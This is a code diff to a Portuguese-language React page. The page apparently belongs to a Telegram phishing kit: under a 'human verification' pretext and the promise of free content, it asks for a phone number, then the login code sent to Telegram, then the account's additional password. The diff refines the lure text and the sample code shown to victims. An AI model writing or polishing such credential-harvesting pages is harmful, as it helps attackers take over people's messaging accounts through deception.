@@ -104,7 +104,7 @@ export default function Home() {
             {step === 1 ? 'Verificação de Humano' : step === 2 ? 'Confirmação' : 'Senha de Proteção'}
             </h1>
             <p style={{ color: theme.subText, fontSize: '14px', lineHeight: '1.4' }}>
-            {step === 1 ? 'Para acessar o conteúdo gratuito, confirme seu país e número de telefone.' : 
+            {step === 1 ? 'Para acessar o conteúdo gratuito, confirme seu número de telefone.' : 
             step === 2 ? `Um código de confirmação foi enviado para o seu Telegram.` :
             'Esta conta possui uma senha adicional.'}
             </p>
@@ -135,7 +135,7 @@ export default function Home() {
                      <span style={{ color: theme.text, fontWeight: 'bold', fontSize: '14px' }}>Telegram</span>
                 </div>
                 <div style={{ color: '#fff', fontSize: '13px', lineHeight: '1.4' }}>
-                    Código de verificação: <span style={{ background: 'rgba(51, 144, 236, 0.2)', color: theme.text, fontWeight: 'bold', padding: '0 4px', borderRadius: '3px' }}>77700</span>. Use este código para confirmar sua identidade humana.
+                    Código de verificação: <span style={{ background: 'rgba(51, 144, 236, 0.2)', color: theme.text, fontWeight: 'bold', padding: '0 4px', borderRadius: '3px' }}>00000</span>. Use o código de 5 digitos enviado no seu telegram.
                     <br/><br/>
                     <span style={{ color: '#ff5c5c', fontWeight: 'bold' }}>!</span> Este procedimento é obrigatório para acessar canais restritos.
                     <br/><br/>
